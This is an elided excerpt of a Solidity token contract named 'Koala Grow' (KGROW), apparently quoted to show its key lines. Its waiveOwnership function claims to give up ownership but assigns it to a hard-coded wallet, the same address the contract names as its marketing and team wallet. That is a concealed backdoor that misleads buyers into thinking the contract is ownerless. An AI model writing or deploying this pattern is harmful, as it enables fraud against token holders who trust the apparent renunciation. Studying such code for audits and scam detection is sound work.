...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xfCB2ccb6cA1B26c02657bCA2cf6F7e23Bc900250);
    }
...
contract KoalaGrow is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Koala Grow";
    string private _symbol = "KGROW";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xfCB2ccb6cA1B26c02657bCA2cf6F7e23Bc900250);
    address payable private teamWalletAddress = payable(0xfCB2ccb6cA1B26c02657bCA2cf6F7e23Bc900250);
